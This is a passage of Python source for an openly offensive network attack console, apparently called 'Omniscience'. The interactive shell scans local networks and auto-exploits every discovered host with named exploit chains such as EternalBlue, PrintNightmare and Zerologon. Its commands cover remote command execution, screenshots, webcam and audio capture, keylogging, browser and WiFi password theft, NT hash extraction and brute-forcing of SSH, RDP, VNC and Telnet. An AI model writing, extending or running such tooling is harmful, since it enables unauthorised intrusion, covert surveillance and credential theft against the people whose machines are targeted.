                if netifaces.AF_INET6 in addrs:
                    for addr_info in addrs[netifaces.AF_INET6]:
                        ip = addr_info.get('addr', '').split('%')[0]
                        if ip and not ip.startswith('::1'):
                            netmask = addr_info.get('netmask', 'N/A')
                            iface_data['ipv6'].append((ip, netmask))
                            self.network_interfaces.append({**iface_data, 'ip': ip, 'netmask': netmask, 'type': 'IPv6'})
                
                # Display interface header
                if iface_data['ipv4'] or iface_data['ipv6']:
                    # Interface name with selection indicator
                    if hasattr(self, 'selected_interface') and self.selected_interface == iface_idx:
                        select_mark = f"{Fore.LIGHTGREEN_EX}◀ SELECTED"
                    else:
                        select_mark = ""
                    
                    print(f"\033[{line};{panel_x}H{Fore.CYAN}{Style.BRIGHT}║{Style.RESET_ALL}{Fore.YELLOW}  [{iface_idx}] {iface:<26} {select_mark}{Fore.CYAN}║")
                    line += 1
                    
                    # Display IPv4 addresses
                    for ip, mask in iface_data['ipv4']:
                        print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}{Fore.WHITE}    {Fore.LIGHTGREEN_EX}IPv4:{Fore.GREEN} {ip:<15} /{Fore.CYAN} {mask:<15} {Fore.CYAN}║")
                        line += 1
                    
                    # Display IPv6 addresses (truncated for display)
                    for ip, mask in iface_data['ipv6'][:2]:
                        short_ip = ip[:22] + '..' if len(ip) > 24 else ip
                        print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}{Fore.WHITE}    {Fore.LIGHTCYAN_EX}IPv6:{Fore.CYAN} {short_ip:<22} {Fore.CYAN}║")
                        line += 1
                    
                    print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}  {Fore.LIGHTBLACK_EX}{'-' * 37} {Fore.CYAN}║")
                    line += 1
                    iface_idx += 1
            
            # Gateways section
            print(f"\033[{line};{panel_x}H{Fore.CYAN}╠══════════════════════════════════════════════╣")
            line += 1
            gws = netifaces.gateways()
            if 'default' in gws:
                for proto, gw_info in gws['default'].items():
                    gw_ip, gw_iface = gw_info
                    proto_name = "IPv4" if proto == netifaces.AF_INET else "IPv6"
                    print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}{Fore.MAGENTA}  GATEWAY {proto_name}: {Fore.LIGHTMAGENTA_EX}{gw_ip:<23} {Fore.CYAN}║")
                    line += 1
            
                print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}    {status_mark} {ip:<29} {Fore.CYAN}║")
                line += 1
            
            if len(self.hosts) > 5:
                print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}    {Fore.LIGHTBLACK_EX}+ {len(self.hosts)-5} more hosts...{' ' * 17} {Fore.CYAN}║")
                line += 1
            
            print(f"\033[{line};{panel_x}H{Fore.CYAN}╠══════════════════════════════════════════════╣")
            line += 1
            
            # Selected target
            print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}{Fore.MAGENTA}  SELECTED TARGET:{' ' * 24} {Fore.CYAN}║")
            line += 1
            if self.selected_target:
                print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}    {Fore.LIGHTMAGENTA_EX}{self.selected_target:<29} {Fore.CYAN}║")
            else:
                print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}    {Fore.LIGHTBLACK_EX}No target selected{' ' * 19} {Fore.CYAN}║")
            line += 1
            
            print(f"\033[{line};{panel_x}H{Fore.CYAN}{Style.BRIGHT}╚══════════════════════════════════════════════╝")
            
            # Reset cursor to safe position
            print("\033[999;0H")
            sys.stdout.flush()
            
        except Exception as e:
            pass

    def run(self):
        """Main interactive shell loop - Hacker Mode"""
        # Play hacker startup sound
        try:
            import winsound
            winsound.Beep(800, 100)
            time.sleep(0.05)
            winsound.Beep(1000, 150)
            time.sleep(0.1)
            winsound.Beep(1200, 200)
        except:
            pass
        
        # Matrix intro effect
        os.system('color 0A')
        os.system('title OMNISCIENCE HACKER MODE - ACTIVE')
        
        # Clear screen and show banner
        os.system('cls' if os.name == 'nt' else 'clear')

        # Play banner
        Visualizer.banner()
        
        # Start background right panel refresh thread
        def panel_refresh():
            while self.running:
                try:
                    self._display_right_panel()
                    time.sleep(2)
                except:
                    pass
        refresh_thread = threading.Thread(target=panel_refresh, daemon=True)
        refresh_thread.start()
        
        self.running = True
        self.command_history = []
        
        print(f"\n  {Fore.GREEN}{Style.BRIGHT}● Omniscience Framework READY  │  Type 'help' for commands\n")
        
        # Main interactive loop
        while self.running:
            try:
                # Hacker prompt - green matrix style
                now = datetime.now().strftime("%H:%M:%S")
                prompt = (f"{Fore.GREEN}{Style.BRIGHT}[{Fore.LIGHTGREEN_EX}{now}{Fore.GREEN}]"
                         f"{Fore.GREEN} omni"
                         f"{Fore.WHITE}@"
                         f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}shell"
                         f"{Fore.WHITE}{Style.RESET_ALL}{Fore.GREEN}❯ {Style.RESET_ALL}")
                
                cmd_line = input(prompt).strip()
                if not cmd_line:
                    continue
                
                # Typing sound effect
                try:
                    HackerSounds.command_exec()
                except:
                    pass
                
                self.process_command(cmd_line)
                
            except KeyboardInterrupt:
                print(f"\n  {Fore.YELLOW}{Style.BRIGHT}⚠  Ctrl+C  │  Type 'exit' to quit gracefully")
                HackerSounds.warning()
            except Exception as e:
                HackerSounds.command_error()
                print(f"\n{Fore.RED}✘ COMMAND ERROR: {str(e)}{Style.RESET_ALL}")
                logger.error(f"Command failed: {cmd_line} | Error: {e}")
    
    def process_command(self, cmd_line):
        """Processes a single command string. Redirects all prints to self._log."""
        if not cmd_line.strip():
            return
        
        self.command_history.append(cmd_line)
        parts = cmd_line.split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        # Command aliases
        aliases = {
            'q': 'quit', 'x': 'exit', 'e': 'exit',
            'l': 'clear', 'cls': 'clear',
            'ls': 'targets', 'll': 'targets',
            'h': 'help', '?': 'help',
            'i': 'info', 'sys': 'systeminfo',
            'run': 'exec', 'cmd': 'exec',
            'del': 'delete', 'rm': 'file delete',
            'cp': 'file upload', 'mv': 'file',
            'cat': 'file list', 'dir': 'file list',
            'netstat': 'network', 'ifconfig': 'interfaces',
            'whoami': 'sysinfo',
            'start': 'exec', 'stop': 'killproc',
            'restart': 'reboot',
            'on': 'persist', 'off': 'persist',
            'up': 'upload', 'down': 'download',
            'wifi': 'steal-wifi', 'wifipass': 'steal-wifi',
            'creds': 'stealcreds', 'hash': 'nethashes',
            'shell': 'exec',
            'ping': 'icmp', 'arp': 'arp',
            'scan': 'auto', 's': 'scan',
            'show': 'targets', 'list': 'targets',
            'connect': 'select', 'disconnect': 'target',
            'c': 'clear', 'cc': 'clear',
        }
        
        # Expand alias
        if cmd in aliases:
            cmd = aliases[cmd]
            # Reconstruct cmd_line with expanded command
            cmd_line = cmd + ' ' + ' '.join(args)
        
         # Validate command before execution
        valid, error = self._validate_command(cmd, args)
        if not valid:
            HackerSounds.command_error()
            self._log(f"{Fore.RED}⚠ {error}")
            return
        
        try:
            # Play command execution sound
            HackerSounds.command_exec()
            
            # ==================== HELP ====================
            if cmd in ("help", "?"):
                self.print_help()
                HackerSounds.command_success()
            
            elif cmd == "tree":
                self.command_tree.print_tree()
                HackerSounds.command_success()
            
            elif cmd == "commands":
                self._log(f"\n{Fore.CYAN}{Style.BRIGHT}Available command categories:")
                for category in self.command_tree.commands.keys():
                    self._log(f"  {Fore.GREEN}▸ {category}")
                self._log(f"\n{Fore.YELLOW}Use 'tree' to see full command hierarchy")
                self._log(f"{Fore.YELLOW}Use 'help <category>' for category-specific help\n")
                HackerSounds.command_success()
            
            # ==================== SYSTEM ====================
            if cmd in ("exit", "quit"):
                self._log(f"{Fore.YELLOW}[*] Exiting...")
                HackerSounds.warning()
                self.running = False

            elif cmd == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                Visualizer.banner()
                HackerSounds.command_success()

            elif cmd == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                Visualizer.banner()
                HackerSounds.command_success()

            elif cmd == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                Visualizer.banner()
                HackerSounds.command_success()

            elif cmd == "history":
                print(f"\n{Fore.CYAN}Command History:")
                for i, c in enumerate(self.command_history):
                    print(f"  {i}: {c}")
                HackerSounds.command_success()

            elif cmd in ("sound", "sounds", "mute", "unmute", "audio"):
                if cmd in ("mute", "off"):
                    HackerSounds.toggle_sound(False)
                    print(f"{Fore.RED}Sound muted")
                elif cmd in ("unmute", "on"):
                    HackerSounds.toggle_sound(True)
                    print(f"{Fore.GREEN}Sound enabled")
                else:
                    state = "ON" if HackerSounds._enabled else "OFF"
                    print(f"{Fore.CYAN}Sound: {Fore.GREEN}{state}")
                    # Play test sound
                    HackerSounds.success()

            elif cmd == "setcreds" and len(args) >= 2:
                self.credentials["user"], self.credentials["pass"] = args[0], args[1]
                print(f"[+] Credentials set: {args[0]}")

            elif cmd == "select" and args:
                try:
                    idx = int(args[0])
                    if 0 <= idx < len(self.hosts):
                        host = self.hosts[idx]
                        # Handle different host object formats (dict, object, or string)
                        if isinstance(host, dict):
                            self.selected_target = host.get('ip')
                        elif hasattr(host, 'ip'):
                            self.selected_target = host.ip
                        else:
                            self.selected_target = str(host)
                        
                        self.targeting.add(self.selected_target)
                        self._display_right_panel()
                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                        print(f"{Fore.GREEN}║  TARGET ACQUIRED: {self.selected_target}")
                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                        
                        # AUTO-EXPLOIT AND CONNECT AUTOMATICALLY - FULL POWER
                        HackerSounds.target_acquired()
                        HackerSounds.scan_beep()
                        
                        success = False
                        exploits_used = []
                        
                        # First use universal engine for unauthenticated access
                        if self.universal:
                            try:
                                res = self.universal.pwn_target(self.selected_target)
                                if res.get('success', False):
                                    success = True
                                    exploits_used = res.get('vulns', [])
                                    print(f"{Fore.LIGHTGREEN_EX}  ✅ UNIVERSAL ACCESS - NO CREDENTIALS REQUIRED")
                                    HackerSounds.exploit_success()
                            except Exception as e:
                                logger.debug(f"Universal exploit failed: {e}")
                        
                        # If universal failed, use control engine exploit chains
                        if not success and self.control:
                            exploit_methods = [
                                'eternal_blue', 'smbghost', 'printnightmare', 
                                'petitpotam', 'zerologon', 'winrm', 'smb_null', 'smb_guest'
                            ]
                            for exploit in exploit_methods:
                                try:
                                    if hasattr(self.control, exploit):
                                        HackerSounds.beep_hack(700 + len(exploits_used)*100, 20)
                                        res = getattr(self.control, exploit)(
                                            self.selected_target, 
                                            self.credentials["user"], 
                                            self.credentials["pass"]
                                        )
                                        if res.get('success', False):
                                            success = True
                                            exploits_used.append(exploit)
                                            print(f"{Fore.LIGHTGREEN_EX}  ✅ {exploit.upper()} SUCCESS")
                                            HackerSounds.exploit_success()
                                            break
                                except Exception as e:
                                    logger.debug(f"{exploit} failed: {e}")
                                    continue
                        
                        self.targeting.discard(self.selected_target)
                        if success:
                            self.compromised.add(self.selected_target)
                            HackerSounds.access_granted()
                            HackerSounds.success()
                            print(f"{Fore.LIGHTGREEN_EX}  ✅ FULL REMOTE CONTROL ESTABLISHED")
                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Vulnerabilities: {', '.join(exploits_used)}")
                            print(f"{Fore.LIGHTGREEN_EX}  ✅ All features active: exec, screen, webcam, audio, keylog")
                            print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                        else:
                            HackerSounds.beep_hack(300, 100)
                            print(f"{Fore.YELLOW}  ⚠ Target discovered. Default credentials may work.")
                            print(f"{Fore.YELLOW}  Use 'setcreds' to set credentials, or try:")
                            print(f"{Fore.YELLOW}    smbghost, printnightmare, petitpotam, zerologon")
                            print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                        
                        self._display_right_panel()
                    else:
                        print(f"{Fore.RED}[!] Invalid index. Run 'targets' to see available IDs.")
                except ValueError:
                    print(f"{Fore.RED}[!] Usage: select <idx>")

            elif cmd == "target":
                if args:
                    self.selected_target = args[0]
                    print(f"[+] Target: {args[0]}")
                else:
                    print(f"Current Target: {Fore.YELLOW}{self.selected_target or 'NONE'}")

            elif cmd == "targets":
                self._show_hosts_table()

            elif cmd in ("dashboard", "status"):
                self._print_dashboard()

            # ==================== DISCOVERY COMMANDS ====================
            elif cmd == "auto":
                print(f"[*] OMNISCIENCE FULL NETWORK SCAN INITIATED")
                print(f"{Fore.GREEN}[*] ARP, ICMP, TCP, NetBIOS, mDNS, SSDP, SNMP active probes")
                HackerSounds.scan_beep()
                
                if self.discovery:
                    # Use REAL fully functional network discovery engine
                    print(f"{Fore.YELLOW}[*] Detecting all networks and interfaces...")
                    self.hosts = self.discovery.auto_scan()
                    print(f"\n{Fore.GREEN}[+] SCAN COMPLETE - {len(self.hosts)} DISCOVERED HOSTS")
                    self._show_hosts_table()
                    # Display IPs at right side live panel
                    self._display_right_panel()
                    
                    # Auto-attempt unauthenticated access on all discovered hosts
                    print(f"\n{Fore.YELLOW}[*] AUTO-EXPLOIT PHASE - NO AUTHENTICATION REQUIRED")
                    if self.universal:
                        compromised = 0
                        for host in self.hosts:
                            ip = host if isinstance(host, str) else (host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host)))
                            try:
                                result = self.universal.pwn_target(ip)
                                if result.get('success', False):
                                    print(f"{Fore.LIGHTGREEN_EX}[+] FULL ACCESS: {ip} - Vulnerabilities: {', '.join(result.get('vulns', []))}")
                                    compromised += 1
                                else:
                                    print(f"{Fore.YELLOW}[-] {ip}: {result.get('status', 'no vulnerabilities')}")
                            except Exception as e:
                                print(f"{Fore.RED}[!] {ip} failed: {str(e)[:40]}")
                        print(f"\n{Fore.GREEN}[+] AUTO-EXPLOIT COMPLETE: {compromised}/{len(self.hosts)} COMPROMISED")
                    HackerSounds.success()

            elif cmd == "fastscan":
                print(f"[*] FAST 10-SEC NETWORK SWEEP INITIATED")
                HackerSounds.network_pulse()
                if self.discovery:
                    self.hosts = self.discovery.fast_sweep()
                    print(f"\n{Fore.GREEN}[+] FAST SCAN COMPLETE - {len(self.hosts)} HOSTS DETECTED")
                    self._show_hosts_table()
                    self._display_right_panel()
                HackerSounds.success()

            elif cmd == "scan" and args:
                if self.discovery:
                    self.hosts = self.discovery.full_scan(args[0]) if hasattr(self.discovery, 'full_scan') else []
                    self._show_hosts_table()

            elif cmd == "arp":
                if not args and self.discovery:
                    hosts = self.discovery.arp_scan(self.discovery.get_current_subnet())
                    print(f"[+] Found {len(hosts)} hosts via ARP")
                elif args and self.discovery:
                    hosts = self.discovery.arp_scan(args[0])
                    print(f"[+] Found {len(hosts)} hosts")

            elif cmd == "icmp":
                if not args and self.discovery:
                    hosts = self.discovery.icmp_sweep(self.discovery.get_current_subnet())
                    print(f"[+] Found {len(hosts)} hosts")
                elif args and self.discovery:
                    hosts = self.discovery.icmp_sweep(args[0])
                    print(f"[+] Found {len(hosts)} hosts")

            elif cmd == "netbios":
                if args and self.discovery:
                    info = self.discovery.netbios_scan(args[0]) if hasattr(self.discovery, 'netbios_scan') else {}
                    print(f"[+] {json.dumps(info, indent=2)}")

            elif cmd == "snmp":
                if args and self.discovery:
                    info = self.discovery.snmp_query(args[0]) if hasattr(self.discovery, 'snmp_query') else {}
                    print(f"[+] {json.dumps(info, indent=2)}")

            elif cmd == "mdns":
                if self.discovery:
                    devices = self.discovery.mdns_listen() if hasattr(self.discovery, 'mdns_listen') else []
                    print(f"[+] Found {len(devices)} mDNS devices")

            elif cmd == "ssdp":
                if self.discovery:
                    devices = self.discovery.ssdp_discover() if hasattr(self.discovery, 'ssdp_discover') else []
                    print(f"[+] Found {len(devices)} UPnP devices")

            elif cmd == "http":
                if args and self.discovery:
                    info = self.discovery.http_fingerprint(args[0]) if hasattr(self.discovery, 'http_fingerprint') else {}
                    print(f"[+] {json.dumps(info, indent=2)}")

            elif cmd == "traceroute":
                if args and self.adv_scan:
                    hops = self.adv_scan.traceroute(args[0]) if hasattr(self.adv_scan, 'traceroute') else []
                    print(f"[+] {len(hops)} hops to {args[0]}")
                    for i, hop in enumerate(hops):
                        print(f"  {i+1}: {hop.get('ip', '*')} {hop.get('latency', '')}ms")
                else:
                    print(f"{Fore.RED}[!] traceroute requires a target IP and advanced scanner module.")

            elif cmd == "topology":
                if self.adv_scan:
                    topo = self.adv_scan.get_topology_map() if hasattr(self.adv_scan, 'get_topology_map') else {}
                    print(f"{json.dumps(topo, indent=2)}")

            elif cmd == "network":
                if self.discovery:
                    info = self.discovery.get_network_info() if hasattr(self.discovery, 'get_network_info') else {}
                    print(f"{json.dumps(info, indent=2)}")

            elif cmd == "interfaces":
                if self.discovery:
                    info = self.discovery.get_interface_info() if hasattr(self.discovery, 'get_interface_info') else {}
                    print(f"{json.dumps(info, indent=2)}")

            elif cmd == "gateway":
                if self.discovery:
                    gw = self.discovery.get_gateway_ip() if hasattr(self.discovery, 'get_gateway_ip') else 'N/A'
                    print(f"Gateway: {gw}")

            elif cmd == "external-ip":
                if self.discovery:
                    ext = self.discovery._detect_external_info() if hasattr(self.discovery, '_detect_external_info') else {}
                    print(f"External IP: {ext.get('external_ip', 'N/A')}")

            elif cmd == "cloud-scan":
                provider = args[0] if args else 'aws'
                if self.adv_scan:
                    devices = self.adv_scan.scan_public_ranges(provider) if hasattr(self.adv_scan, 'scan_public_ranges') else []
                    print(f"[+] Found {len(devices)} devices in {provider} ranges")

            # ==================== INTELLIGENCE ====================
            elif cmd == "sniff":
                if self.intel:
                    iface = args[0] if args else None
                    self.intel.start_sniffing(iface=iface)
                    print(f"[+] Sniffer active")

            elif cmd == "stopsniff":
                if self.intel:
                    self.intel.stop_sniffing()
                    print(f"[*] Sniffer stopped")

            elif cmd == "creds":
                if self.intel:
                    creds = self.intel.get_credentials() if hasattr(self.intel, 'get_credentials') else []
                    Visualizer.table(["TIME", "SOURCE", "DATA"], 
                        [[c.get('time','?'), c.get('src','?'), str(c.get('data','?'))[:40]] for c in creds[:20]],
                        "CREDENTIALS")

            elif cmd == "dns-log":
                if self.intel:
                    logs = self.intel.get_dns_log() if hasattr(self.intel, 'get_dns_log') else []
                    Visualizer.table(["TIME", "QUERY"], [[l.get('time','?'), l.get('query','?')] for l in logs[:20]], "DNS")

            elif cmd == "monitor":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.intel:
                    self.intel.wmi_monitor_activity(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Monitoring {target}")

            elif cmd == "wmi-proc":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.intel and hasattr(self.intel, 'wmi_processes'):
                    procs = self.intel.wmi_processes(target, self.credentials["user"], self.credentials["pass"])
                    Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")

            elif cmd == "wmi-users":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.intel and hasattr(self.intel, 'wmi_logged_users'):
                    users = self.intel.wmi_logged_users(target, self.credentials["user"], self.credentials["pass"])
                    print(f"{json.dumps(users, indent=2)}")

            # ==================== CONTROL ====================
            elif cmd == "exec" and len(args) >= 1:
                target = self.selected_target
                cmd_to_run = " ".join(args)
                if args[0].count('.') >= 3: # Primitive IP check
                    target = args[0]
                    cmd_to_run = " ".join(args[1:])
                
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'wmi_exec'):
                    HackerSounds.network_pulse()
                    res = self.control.wmi_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
                    print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.GREEN}║  COMMAND EXECUTION RESULTS")
                    print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                    print(f"{Fore.LIGHTGREEN_EX}{res.get('output', 'No output')}")
                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                    HackerSounds.success()

            elif cmd == "ssh-exec" and len(args) >= 1:
                target = self.selected_target
                cmd_to_run = " ".join(args)
                if args[0].count('.') >= 3:
                    target = args[0]
                    cmd_to_run = " ".join(args[1:])
                    
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'ssh_exec'):
                    res = self.control.ssh_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
                    print(f"{res}")

            elif cmd == "screen":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'wmi_screenshot'):
                    path = self.control.wmi_screenshot(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Screenshot: {path}")
                    Visualizer.display_screenshot(path)

            elif cmd == "webcam":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'take_webcam_snapshot'):
                    path = self.control.take_webcam_snapshot(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Webcam: {path}")

            elif cmd == "audio":
                target = self.selected_target
                dur = 10
                if args:
                    if args[0].count('.') >= 3:
                        target = args[0]
                        dur = int(args[1]) if len(args) > 1 else 10
                    else:
                        dur = int(args[0])
                        
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'wmi_capture_audio'):
                    path = self.control.wmi_capture_audio(target, self.credentials["user"], self.credentials["pass"], duration=dur)
                    print(f"[+] Audio: {path}")

            elif cmd == "keylog":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'wmi_keylogger_start'):
                    self.control.wmi_keylogger_start(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Keylogger started on {target}")

            elif cmd == "clipboard-get":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'get_clipboard'):
                    clip = self.control.get_clipboard(target, self.credentials["user"], self.credentials["pass"])
                    print(f"Clipboard: {clip}")

            elif cmd == "clipboard-set" and len(args) >= 1:
                target = self.selected_target
                txt = " ".join(args)
                if args[0].count('.') >= 3:
                    target = args[0]
                    txt = " ".join(args[1:])
                    
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'set_clipboard'):
                    self.control.set_clipboard(target, self.credentials["user"], self.credentials["pass"], txt)
                    print(f"[+] Clipboard set")

            elif cmd == "pslist":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'list_processes'):
                    procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
                    Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")

            elif cmd == "killproc" and len(args) >= 1:
                target = self.selected_target
                pid = int(args[0])
                if args[0].count('.') >= 3:
                    target = args[0]
                    pid = int(args[1]) if len(args) > 1 else 0
                    
                if not target or not pid:
                    print(f"{Fore.RED}[!] Usage: killproc [ip] <pid>")
                    return
                    
                if self.control and hasattr(self.control, 'kill_process'):
                    self.control.kill_process(target, self.credentials["user"], self.credentials["pass"], pid=pid)
                    print(f"[+] Process {pid} killed on {target}")

            elif cmd == "svc-list":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'list_services'):
                    svcs = self.control.list_services(target, self.credentials["user"], self.credentials["pass"])
                    Visualizer.table(["NAME", "STATUS"], [[s.get('Name','?'), s.get('Status','?')] for s in svcs[:20]], "SERVICES")

            elif cmd == "vault":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'wmi_harvest_vault'):
                    data = self.control.wmi_harvest_vault(target, self.credentials["user"], self.credentials["pass"])
                    print(f"{json.dumps(data, indent=2)}")

            # ==================== EXPLOIT ====================
            elif cmd == "omnifetch":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'omnifetch <ip>'.")
                    return
                print(f"[*] OmniFetch for {target}...")
                if self.universal:
                    self.universal.pwn_target(target)
                if self.control and hasattr(self.control, 'get_browser_data'):
                    data = self.control.get_browser_data(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] {json.dumps(data, indent=2)}")

            elif cmd == "stealcreds":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'stealcreds <ip>'.")
                    return
                if self.control:
                    pw = self.control.get_browser_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_browser_passwords') else {}
                    wifi = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_wifi_passwords') else {}
                    print(f"[+] Passwords: {json.dumps(pw, indent=2)}")
                    print(f"[+] WiFi: {json.dumps(wifi, indent=2)}")
        
            elif cmd in ("pwn", "exploit") and args:
                target = args[0]
                HackerSounds.alert()
                self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                self._log(f"{Fore.GREEN}║  EXPLOITING TARGET: {target}")
                self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                success = False
                exploits = []
                
                if self.universal:
                    device = self.universal.devices.get(target)
                    if device:
                        self.universal._scan_device(device)
                        if device.can_pwn:
                            success = True
                            exploits = device.is_vulnerable
                
                if self.control:
                    # Try all exploit chains
                    chains = ["eternal_blue", "smbghost", "printnightmare", "petitpotam", "winrm"]
                    for chain in chains:
                        try:
                            if hasattr(self.control, chain):
                                res = getattr(self.control, chain)(target, self.credentials["user"], self.credentials["pass"])
                                if res.get('success'):
                                    success = True
                                    exploits.append(chain)
                        except:
                            pass
                
                if success:
                    HackerSounds.exploit_success()
                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ EXPLOIT SUCCESSFUL")
                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ ACCESS GRANTED TO {target}")
                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ Vulnerabilities: {', '.join(exploits)}")
                else:
                    self._log(f"{Fore.RED}  ❌ Exploit failed")
                
                self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
            elif cmd in ("attack", "pwnall"):
                HackerSounds.alert()
                MatrixEffects.target_lock()
                self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                self._log(f"{Fore.GREEN}║  GLOBAL NETWORK ASSAULT INITIATED")
                self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                total = len(self.hosts)
                compromised = 0
                
                for i, host in enumerate(self.hosts):
                    try:
                        ip = host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host))
                        self._log(f"{Fore.LIGHTGREEN_EX}  ⟶ [{i+1}/{total}] Targeting {ip}...")
                        
                        if self.universal:
                            device = self.universal.devices.get(ip)
                            if device:
                                self.universal._scan_device(device)
                                if device.can_pwn:
                                    compromised += 1
                                    self._log(f"{Fore.GREEN}    ✅ COMPROMISED: {ip}")
                        
                    except Exception as e:
                        self._log(f"{Fore.RED}    ❌ Failed: {str(e)[:30]}")
                
                HackerSounds.exploit_success()
                self._log(f"\n{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                self._log(f"{Fore.LIGHTGREEN_EX}  OPERATION COMPLETE")
                self._log(f"{Fore.LIGHTGREEN_EX}  Total targets    : {total}")
                self._log(f"{Fore.LIGHTGREEN_EX}  Compromised      : {compromised}")
                self._log(f"{Fore.LIGHTGREEN_EX}  Success rate     : {int((compromised/total)*100) if total > 0 else 0}%")
                self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")

            elif cmd == "nethashes":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'extract_nt_hashes'):
                    hashes = self.control.extract_nt_hashes(target, self.credentials["user"], self.credentials["pass"])
                    print(f"{json.dumps(hashes, indent=2)}")

            elif cmd == "ssh-brute" and args:
                if self.control and hasattr(self.control, 'ssh_brute'):
                    result = self.control.ssh_brute(args[0])
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "rdp-brute" and args:
                if self.control and hasattr(self.control, 'rdp_brute_force'):
                    result = self.control.rdp_brute_force(args[0])
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "vnc-brute" and args:
                if self.control and hasattr(self.control, 'vnc_brute_force'):
                    result = self.control.vnc_brute_force(args[0])
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "telnet-brute" and args:
                if self.control and hasattr(self.control, 'telnet_brute_force'):
                    result = self.control.telnet_brute_force(args[0])
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "steal-wifi" or cmd == "steal_wifi":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'steal-wifi <ip>'.")
                    return
                Visualizer.alert(f"Extracting WiFi passwords from {target} ...", "hack")
                if self.control and hasattr(self.control, 'get_wifi_passwords'):
                    result = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"])
                    networks = result.get("networks", {})
                    if networks:
                        print(f"\n  {Fore.CYAN}{Style.BRIGHT}WiFi Passwords harvested from {target}:")
